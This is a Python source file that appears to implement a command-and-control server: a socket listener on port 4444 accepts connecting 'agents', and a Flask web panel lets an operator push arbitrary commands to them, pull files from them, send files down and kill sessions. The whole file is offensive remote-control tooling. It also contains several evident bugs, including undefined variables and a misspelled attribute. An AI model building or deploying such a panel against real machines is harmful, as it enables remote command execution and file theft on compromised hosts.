import socket
import threading
from flask import Flask, render_template, redirect, request
import datetime


IP = "127.0.0.1"
PORT = 4444
SIZE = 2048
FORMAT = "utf-8"

app = Flask(__name__)


class Server:
    threads = []
    clients = []

    def __init__(self, ip, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((ip, port))
        self.sock.listen()
        print("[+] Server has Initialized")

    def set_thread(self, thread):
        self.threads.append(thread)

    def find_thread(self, id):
        for x in self.threads:
            if x.name == id:
                return x

    def remove_client(self, thread, client):
        for t in self.threads:
            if t.name == thread.name:
                self.threads.remove(thread)
        self.clients.remove(client)

    def add_client(self, client):
        self.clients.append(client)


class Connection:
    def __init__(self, socket, rAddr, id):
        self.socket = socket
        self.rAddr = rAddr
        self.id = str(id)
        self.frm_client = ""
        self.to_send = " "

    def __del__(self):
        self.socket.close()

    def set_thread(self, thread):
        self.thread = thread

    def close_socket(self):
        print(f"[-] Cliend ID: {self.id} will now disconnect")
        self.socket.close()
        # not sure if this is needed. Goal is to kill the thread too.
        # exit()

    def send(self, msg):
        try:
            self.to_send = msg
            self.socket.send(msg.encode("utf-8"))
        except ConnectionResetError as connReset:
            print(f"client init shutdown, closing.")
            self.close_socket()

    def send_file(self, file):
        try:
            self.socket.send(file)
        except ConnectionResetError as conReset:
            print(f"client init shutdown, closing")
            self.close_socket()

    def recv(self, size):
        try:
            self.frm_client = self.socket.recv(size).decode("utf-8")
            return self.frm_client
        except ConnectionResetError as connReset:
            print(f"client init shutdown, closing.")
            self.close_socket()


# this function gets ran by every connection.
def handle_client(client, server):
    print(f"New client connected: {client.rAddr}")
    while client.frm_client != "close":
        # print(client.to_send)
        try:
            if "upload" in client.to_send:
                print("server has seen upload command")
                filename = client.to_send[6:].strip(" ")
                print(f"attempting to open file: '{filename}'")
                try:
                    with open(filename, "r") as f:
                        bin_file = f.read()
                        print(f"sending filename: {filename}")
                        client.send(bin_file)
                        f.close()
                        client.to_send = " "
                except:
                    print("couldn't send file")
                    client.to_send = " "
            elif "download" in client.to_send:
                print("server has seen download command")
                filename = client.to_send[8:].split(" ")[1]
                filename = f"./{filename}"
                print(f"attempting to open {filename}")
                with open(filename, "w") as f:
                    print(f"{filename} has been opened")
                    file = client.recv(2048)  # .decode("Utf-8")
                    print(f"{filename} has been recieved from the client")
                    f.write(file)
                    print(f"{filename} has been saved to server disk")
                    f.close()
                client.to_send = " "
            elif client.to_send == "whoami":
                msg = client.recv(1024)
                print(f"[{client.rAddr}]: {msg}")
                msg = f"Msg recieved: {msg}"
                client.send(msg)
            elif client.to_send[0] == "!":
                msg = client.recv(2048)
                print(f"[{client.rAddr}]: {msg}")
                msg = f"Msg recieved: {msg}"
                client.send(msg)
                client.to_send = " "
            elif "kill" in client.to_send:
                client.send(client.to_send)
                client.close_socket()
                for t in server.threads:
                    if client.id in t.name:
                        server.remove_client(t, client)
                client.to_send = " "
            elif client.to_send is None:
                continue
            elif client.to_send == " ":
                continue
            else:
                continue

        except ConnectionResetError as connReset:
            print(f"client {c.id} init shutdown, closing")
            client.frm_client = "closed"
            for c in server.clients:
                if c.id == threading.current_thread().name:
                    t = server.find_thread(c.id)
                    server.remove_client(t, c)
        except BrokenPipeError as brkPipe:
            print(f"client {client.id} has disconnected")
            client.frm_client = "close"
            for c in server.clients:
                if c.id == threading.current_thread().name:
                    t = server.find_thread(c.id)
                    server.remove_client(t, c)
            client.frm_lient = "close"
        except OSError as oserror:
            client.frm_client = "close"
            print(f"client {client.id} has disconnected")
            for c in server.clients:
                if c.id == threading.current_thread().name:
                    t = server.find_thread(c.id)
                    server.remove_client(t, c)
            client.frm_client = "close"

    # Close out the connection, remove thread from list, and die.
    print(f"[-] Client {client.rAddr}:{client.id} has disconnected.")
    server.remove_client(threading.current_thread(), client)
    client.close_socket()
    exit()

def build_server():
    print("[+] Starting Server")
    #NEED TO REMOVE GLOBAL
    global s
    s = Server(IP, PORT)
    id = 1
    while True:
        try:
            sock_obj, addr = s.sock.accept()
            print(s.threads)
            print(s.clients)
            c = Connection(sock_obj, addr, id)
            thread = threading.Thread(name=id, target=handle_client, args=(c, s))
            thread.start()
            c.set_thread(thread)
            s.add_client(c)
            s.set_thread(thread)
            id += 1                                     # needs - 3.
            print(f"Active Connections: {threading.active_count() - 3}")
        except KeyboardInterrupt:
            print(f"{datetime.datetime.now()} CAUGHT EXCEPTION, EXITING...")
            for x in server_object.clients:
                x.close_socket()
                del x
            s.threads.clear()
            print("!!!THREADS KILLED!!!")
            s.clients.clear()
            print("CLEANUP COMPLETE, GOODBYE..")
            exit()
        except ValueError as vErr:
            print("[-] ValueError occured, doesn't effect us")

# Define routes and build out web pages:
@app.before_first_request
def init_server():
    server_thread = threading.Thread(target=build_server)
    server_thread.start()

@app.route("/index")
@app.route("/")
@app.route("/index.html")
@app.route("/home")
def home():
    return render_template("index.html")

@app.route("/agents")
@app.route("/agents.html")
def agents():
    return render_template("agents.html", server_object=s)

@app.route("/<agentName>/execmd")
def execmd(agentName):
    return render_template("execmd.html", agentName=agentName, server_object=s)

@app.route("/<agentName>/exec", methods=["POST"])
def exec(agentName):
    cmd = request.form["command"]
    for x in s.clients:
        if agentName in x.id:
            x.send(cmd)
            return redirect(f"http://localhost:8080/{agentName}/execmd")

if __name__ == "__main__":
    # app.run(port=8080, debug=True)
    app.run(port=8080)
